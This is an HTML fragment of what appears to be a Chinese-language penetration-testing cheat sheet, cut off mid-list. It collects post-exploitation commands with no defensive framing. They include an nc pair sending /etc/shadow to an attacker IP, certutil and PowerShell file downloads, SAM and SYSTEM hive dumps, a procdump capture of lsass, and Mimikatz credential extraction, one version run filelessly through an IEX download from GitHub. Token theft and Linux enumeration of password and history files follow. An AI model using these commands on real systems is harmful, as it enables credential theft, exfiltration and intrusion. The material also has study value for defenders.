id=\"FTP\"><a href=\"#FTP\" class=\"headerlink\" title=\"FTP\"></a>FTP</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp -s:<span class=\"number\">1</span><span class=\"selector-class\">.txt</span>                        <span class=\"comment\">//以1.txt中的内容执行ftp命令</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"VBS\"><a href=\"#VBS\" class=\"headerlink\" title=\"VBS\"></a>VBS</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 下载文件程序 &gt;&gt; loader.vbs</span><br><span class=\"line\">cscript loader<span class=\"selector-class\">.vbs</span> 远程文件位置 保存文件位置</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell -exec bypass -c (new-<span class=\"selector-tag\">object</span> System<span class=\"selector-class\">.Net</span><span class=\"selector-class\">.WebClient</span>).DownloadFile(<span class=\"string\">'远程文件位置'</span>,<span class=\"string\">'保存文件位置'</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"certutil\"><a href=\"#certutil\" class=\"headerlink\" title=\"certutil\"></a>certutil</h4><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certutil.<span class=\"keyword\">exe</span> -urlcache -<span class=\"keyword\">split</span> -<span class=\"keyword\">f</span> 远程文件位置</span><br><span class=\"line\">certutil.<span class=\"keyword\">exe</span> -urlcache -<span class=\"keyword\">split</span> -<span class=\"keyword\">f</span> 远程文件位置 <span class=\"keyword\">delete</span> 删除缓存</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><h4 id=\"wget和wput\"><a href=\"#wget和wput\" class=\"headerlink\" title=\"wget和wput\"></a>wget和wput</h4><h4 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">攻击端监听端口，并重定向：</span><br><span class=\"line\">nc -nvv -lp <span class=\"number\">4455</span> &gt; shaodw.txt</span><br><span class=\"line\">目标机将文件内容回传：</span><br><span class=\"line\">nc <span class=\"number\">192.168</span><span class=\"number\">.111</span><span class=\"number\">.251</span> <span class=\"number\">4455</span> &lt; /etc/shadow</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"curl\"><a href=\"#curl\" class=\"headerlink\" title=\"curl\"></a>curl</h4><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -O http://<span class=\"number\">192.168</span><span class=\"meta\">.111</span><span class=\"meta\">.1</span>:<span class=\"number\">8080</span>/<span class=\"keyword\">test</span>/putty.exe</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"scp\"></a>scp</h4><h4 id=\"Rsync\"><a href=\"#Rsync\" class=\"headerlink\" title=\"Rsync\"></a>Rsync</h4><h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><h4 id=\"python快速搭建服务器\"><a href=\"#python快速搭建服务器\" class=\"headerlink\" title=\"python快速搭建服务器\"></a>python快速搭建服务器</h4><table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">命令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">http</td>\n<td align=\"center\">python -m SimpleHTTPServer 80</td>\n</tr>\n<tr>\n<td align=\"center\">ftp</td>\n<td align=\"center\">python -m pyftpdlib -p 21 (需要安装,默认用户anonymous)</td>\n</tr>\n</tbody></table>\n<h4 id=\"防火墙对ftp两种模式的影响-尤其是Windows自带的ftp\"><a href=\"#防火墙对ftp两种模式的影响-尤其是Windows自带的ftp\" class=\"headerlink\" title=\"防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)\"></a>防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)</h4><h4 id=\"powershell搭建http\"><a href=\"#powershell搭建http\" class=\"headerlink\" title=\"powershell搭建http\"></a>powershell搭建http</h4><p><a href=\"https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1\" target=\"_blank\" rel=\"noopener\">https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1</a></p>\n<h2 id=\"Windows信息收集\"><a href=\"#Windows信息收集\" class=\"headerlink\" title=\"Windows信息收集\"></a>Windows信息收集</h2><h3 id=\"系统信息\"><a href=\"#系统信息\" class=\"headerlink\" title=\"系统信息\"></a>系统信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br><span class=\"line\"><span class=\"comment\">#csv格式</span></span><br><span class=\"line\">systeminfo /fo:csv</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户及用户组信息\"><a href=\"#用户及用户组信息\" class=\"headerlink\" title=\"用户及用户组信息\"></a>用户及用户组信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看当前用户及sid</span></span><br><span class=\"line\">whoami /user</span><br><span class=\"line\"><span class=\"comment\">#查看用户组</span></span><br><span class=\"line\">whoami /proups</span><br><span class=\"line\"><span class=\"comment\">#查看用户权限</span></span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看用户</span></span><br><span class=\"line\">net user</span><br><span class=\"line\"><span class=\"comment\">#查看admin用户详细信息</span></span><br><span class=\"line\">net user <span class=\"string\">\"admin\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看组</span></span><br><span class=\"line\">net localgroup</span><br><span class=\"line\"><span class=\"comment\">#查看administrators组</span></span><br><span class=\"line\">net localgroup <span class=\"string\">\"administrators\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看密码策略</span></span><br><span class=\"line\">net accounts</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"登录信息\"><a href=\"#登录信息\" class=\"headerlink\" title=\"登录信息\"></a>登录信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query user</span><br><span class=\"line\"><span class=\"comment\">#查看在线用户，登陆时间，登录类型</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络信息\"><a href=\"#网络信息\" class=\"headerlink\" title=\"网络信息\"></a>网络信息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig</span><br><span class=\"line\">ipconfig /all</span><br><span class=\"line\">ipconfig /displaydns</span><br><span class=\"line\"></span><br><span class=\"line\">route</span><br><span class=\"line\"><span class=\"comment\">#查看路由信息</span></span><br><span class=\"line\">route print -<span class=\"number\">4</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#显示arp缓存</span></span><br><span class=\"line\">arp -a</span><br><span class=\"line\"></span><br><span class=\"line\">netstat</span><br><span class=\"line\"><span class=\"comment\">#显示活动的tcp,udp及对应pid</span></span><br><span class=\"line\">netstat -ano</span><br><span class=\"line\"><span class=\"comment\">#显示tcp连接</span></span><br><span class=\"line\">netstat -p tcp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看共享信息</span></span><br><span class=\"line\">net share </span><br><span class=\"line\"><span class=\"comment\">#查看c$共享信息</span></span><br><span class=\"line\">net share c$</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#检索网络连接列表</span></span><br><span class=\"line\">net use</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"敏感文件\"><a href=\"#敏感文件\" class=\"headerlink\" title=\"敏感文件\"></a>敏感文件</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.cmdkey /list</span><br><span class=\"line\"><span class=\"number\">2</span>.Hosts文件 （C:\\Windows\\System32\\drivers\\etc\\hosts）</span><br><span class=\"line\"><span class=\"number\">3</span>.回收站(cmd)</span><br><span class=\"line\">cd C:\\<span class=\"variable\">$RECYCLE</span>.BIN</span><br><span class=\"line\"><span class=\"comment\">#dir /ah （查看文件夹，包括隐藏文件）</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"IIS信息收集\"><a href=\"#IIS信息收集\" class=\"headerlink\" title=\"IIS信息收集\"></a>IIS信息收集</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IIS6 - adminscripts</span><br><span class=\"line\">IIS7之后 - appcmd</span><br><span class=\"line\">路径：%systemroot%\\system32\\inetsrv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#有权限条件下可执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#列出网站列表</span></span><br><span class=\"line\">%systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class=\"line\"><span class=\"comment\">#列出物理路径</span></span><br><span class=\"line\">%systemroot%/system32/inetsrv/appcmd.exe list vdir</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"凭证收集\"><a href=\"#凭证收集\" class=\"headerlink\" title=\"凭证收集\"></a>凭证收集</h3><p>思路：Windows hash、浏览器密码、cookie、远程桌面密码、VPN密码、WLAN密码、IIS服务器密码、FTP服务器密码等。</p>\n<h4 id=\"Windows-Hash\"><a href=\"#Windows-Hash\" class=\"headerlink\" title=\"Windows Hash\"></a>Windows Hash</h4><p>NTLM hash 和 LM Hash</p>\n<p>hash在内存中可被抓取</p>\n<h4 id=\"离线凭证收集\"><a href=\"#离线凭证收集\" class=\"headerlink\" title=\"离线凭证收集\"></a>离线凭证收集</h4><h5 id=\"reg命令保存注册表键\"><a href=\"#reg命令保存注册表键\" class=\"headerlink\" title=\"reg命令保存注册表键\"></a>reg命令保存注册表键</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#注意UAC</span></span><br><span class=\"line\">reg save hklm\\sam c:\\sam.hive</span><br><span class=\"line\">reg save hklm\\system c:\\system.hive</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"使用Invoke-NinjaCopy\"><a href=\"#使用Invoke-NinjaCopy\" class=\"headerlink\" title=\"使用Invoke-NinjaCopy\"></a>使用Invoke-NinjaCopy</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell -exec bypass</span><br><span class=\"line\"><span class=\"built_in\">Import-Module</span> .\\invoke-ninjacopy.ps1</span><br><span class=\"line\"><span class=\"comment\"># -Path SAM/SYSTEM了路径  -LocalDestination 保存位置</span></span><br><span class=\"line\">Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination c：\\sam.hive </span><br><span class=\"line\">Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination c：\\system.hive</span><br></pre></td></tr></table></figure>\n\n<p>利用上述手段将两个文件保存到本地，再用saminside或cain导入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#### Saminside</span></span><br><span class=\"line\"></span><br><span class=\"line\">exe程序，需要拿到sam和system文件</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#### Cain</span></span><br><span class=\"line\"></span><br><span class=\"line\">类似Saminside。</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h5 id=\"离线提取lsass进程\"><a href=\"#离线提取lsass进程\" class=\"headerlink\" title=\"离线提取lsass进程\"></a>离线提取lsass进程</h5><p>任务管理器找到lsass进程后右键转储文件。（不同版本Windows进程名可能不同）</p>\n<h5 id=\"procdump-exe\"><a href=\"#procdump-exe\" class=\"headerlink\" title=\"procdump.exe\"></a>procdump.exe</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#cmd下</span></span><br><span class=\"line\">procdump.exe -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>\n\n<p>再用mimikatz提取密码(管理员)  （有Powershell版Mimikatz）</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::minidump lsass.dmp </span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"在线凭证收集\"><a href=\"#在线凭证收集\" class=\"headerlink\" title=\"在线凭证收集\"></a>在线凭证收集</h4><h5 id=\"Mimikatz\"><a href=\"#Mimikatz\" class=\"headerlink\" title=\"Mimikatz\"></a>Mimikatz</h5><p><a href=\"https://github.com/gentilkiwi/mimikatz\" target=\"_blank\" rel=\"noopener\">https://github.com/gentilkiwi/mimikatz</a></p>\n<h5 id=\"Powershell版Mimikatz\"><a href=\"#Powershell版Mimikatz\" class=\"headerlink\" title=\"Powershell版Mimikatz\"></a>Powershell版Mimikatz</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Powershell版</span></span><br><span class=\"line\"><span class=\"comment\">#写好的Powershell文件</span></span><br><span class=\"line\">powershell <span class=\"built_in\">Import-Module</span> .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command <span class=\"string\">'\"privilege::debug\" \"sekurlsa::logonPasswords full\"'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#无文件执行</span></span><br><span class=\"line\">powershell Iex (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command <span class=\"string\">'\"privilege::debug\" \"sekurlsa::logonPasswords full\"'</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Windows访问令牌\"><a href=\"#Windows访问令牌\" class=\"headerlink\" title=\"Windows访问令牌\"></a>Windows访问令牌</h3><p>系统使用令牌来控制用户可访问的对象，并控制用户执行相关系统操作。</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#两种<span class=\"keyword\">token</span></span><br><span class=\"line\">·Delegation <span class=\"keyword\">token</span>（授权令牌]：用于交互会话登录（例如本地用户直接登录、远程</span><br><span class=\"line\">桌面登录）</span><br><span class=\"line\">·Impersonation <span class=\"keyword\">token</span>（模拟令牌]：用于非交互登录（利用<span class=\"keyword\">net</span> <span class=\"keyword\">use</span>访问共享文件夹）</span><br></pre></td></tr></table></figure>\n\n<p>注：</p>\n<p>两种token只在系统重启后清除</p>\n<p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p>\n<h4 id=\"令牌窃取\"><a href=\"#令牌窃取\" class=\"headerlink\" title=\"令牌窃取\"></a>令牌窃取</h4><h5 id=\"mimikatz\"><a href=\"#mimikatz\" class=\"headerlink\" title=\"mimikatz\"></a>mimikatz</h5><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#管理员运行mimikatz</span></span><br><span class=\"line\"><span class=\"comment\">#获取debug权限</span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\"><span class=\"comment\">#模仿system用户的令牌</span></span><br><span class=\"line\">token::elevate</span><br><span class=\"line\"><span class=\"comment\">#列出令牌</span></span><br><span class=\"line\">token::list</span><br><span class=\"line\"><span class=\"comment\">#获取sam数据库中的密码</span></span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\"><span class=\"comment\">#恢复令牌</span></span><br><span class=\"line\">token::revert</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Invoke-TokenManipulation-ps1\"><a href=\"#Invoke-TokenManipulation-ps1\" class=\"headerlink\" title=\"Invoke-TokenManipulation.ps1\"></a>Invoke-TokenManipulation.ps1</h5><p> <a href=\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1\" target=\"_blank\" rel=\"noopener\">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>\n<h5 id=\"meterpreter中incognito\"><a href=\"#meterpreter中incognito\" class=\"headerlink\" title=\"meterpreter中incognito\"></a>meterpreter中incognito</h5><h2 id=\"Linux下信息收集\"><a href=\"#Linux下信息收集\" class=\"headerlink\" title=\"Linux下信息收集\"></a>Linux下信息收集</h2><h3 id=\"查看系统类型\"><a href=\"#查看系统类型\" class=\"headerlink\" title=\"查看系统类型\"></a>查看系统类型</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/issue</span><br><span class=\"line\">cat /etc/*-release</span><br><span class=\"line\">cat /etc/lsb-release</span><br><span class=\"line\">cat /etc/redhat-release (红帽子)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"内核版本\"><a href=\"#内核版本\" class=\"headerlink\" title=\"内核版本\"></a>内核版本</h3><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /<span class=\"keyword\">proc</span>/version</span><br><span class=\"line\">uname -a</span><br><span class=\"line\">uname -mrs</span><br><span class=\"line\">rpm -q<span class=\"title\"> kernel</span></span><br><span class=\"line\"><span class=\"title\">dmesg</span> |<span class=\"title\"> grep</span> linux</span><br><span class=\"line\">ls /boot |<span class=\"title\"> grep</span> vmlinux</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"进程与服务\"><a href=\"#进程与服务\" class=\"headerlink\" title=\"进程与服务\"></a>进程与服务</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ps</span> aux</span><br><span class=\"line\"><span class=\"keyword\">ps</span> -ef</span><br><span class=\"line\">top</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/services</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装的应用程序\"><a href=\"#安装的应用程序\" class=\"headerlink\" title=\"安装的应用程序\"></a>安装的应用程序</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dpkg -l</span></span><br><span class=\"line\"><span class=\"attribute\">rpm -qa</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本信息收集\"><a href=\"#基本信息收集\" class=\"headerlink\" title=\"基本信息收集\"></a>基本信息收集</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cat</span> /etc/syslog.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/chttp.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/lighttpd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/cups/cupsd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/inetd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/apache2/apache2.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/my.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/httpd/<span class=\"keyword\">conf</span>/httpd.<span class=\"keyword\">conf</span> </span><br><span class=\"line\"><span class=\"keyword\">cat</span> /<span class=\"keyword\">opt</span>/lampp/etc/httpd.<span class=\"keyword\">conf</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计划任务\"><a href=\"#计划任务\" class=\"headerlink\" title=\"计划任务\"></a>计划任务</h3><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l</span><br><span class=\"line\"><span class=\"number\">1</span>s -alh <span class=\"meta-keyword\">/var/</span>spool/cron</span><br><span class=\"line\"><span class=\"number\">1</span>s -al <span class=\"meta-keyword\">/etc/</span> | grep cron</span><br><span class=\"line\"><span class=\"number\">1</span>s -al <span class=\"meta-keyword\">/etc/</span>cron*</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron*</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>at.allow </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>at.deny</span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron.allow </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>cron.deny </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>crontab </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/etc/</span>anacrontab </span><br><span class=\"line\">cat <span class=\"meta-keyword\">/var/</span>spool<span class=\"meta-keyword\">/cron/</span>crontabs/root</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络配置\"><a href=\"#网络配置\" class=\"headerlink\" title=\"网络配置\"></a>网络配置</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/network/interfaces </span><br><span class=\"line\">cat /etc/sysconfig<span class=\"built_in\">/network </span></span><br><span class=\"line\">cat /etc/resolv.conf </span><br><span class=\"line\">cat /etc/sysconfig<span class=\"built_in\">/network </span></span><br><span class=\"line\">cat /etc/networks </span><br><span class=\"line\">iptables-L </span><br><span class=\"line\">hostname </span><br><span class=\"line\">dnsdomainname</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络通信\"><a href=\"#网络通信\" class=\"headerlink\" title=\"网络通信\"></a>网络通信</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">netstat -antup</span></span><br><span class=\"line\"><span class=\"attribute\">netstat -antpx</span></span><br><span class=\"line\"><span class=\"attribute\">netstat -tulpn</span></span><br><span class=\"line\"><span class=\"attribute\">arp -e</span></span><br><span class=\"line\"><span class=\"attribute\">route</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户信息\"><a href=\"#用户信息\" class=\"headerlink\" title=\"用户信息\"></a>用户信息</h3><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id</span><br><span class=\"line\">who</span><br><span class=\"line\"><span class=\"built_in\">w</span></span><br><span class=\"line\">last</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/sudoers</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/passwd</span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/<span class=\"built_in\">group</span></span><br><span class=\"line\"><span class=\"keyword\">cat</span> /etc/shadow</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.bash_history </span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.nano_history</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.atftp_history</span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.mysql_history </span><br><span class=\"line\"><span class=\"keyword\">cat</span> ~/.php-history</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"日志信息\"><a href=\"#日志信息\" class=\"headerlink\" title=\"日志信息\"></a>日志信息</h3><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/httpd/logs/*</span><br><span class=\"line\">/var/log/*</span><br><span class=\"line\">/var/run/utmp</span><br></pre></td></tr></table></figure>\n\n<p>提权suid程序和写入目录</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 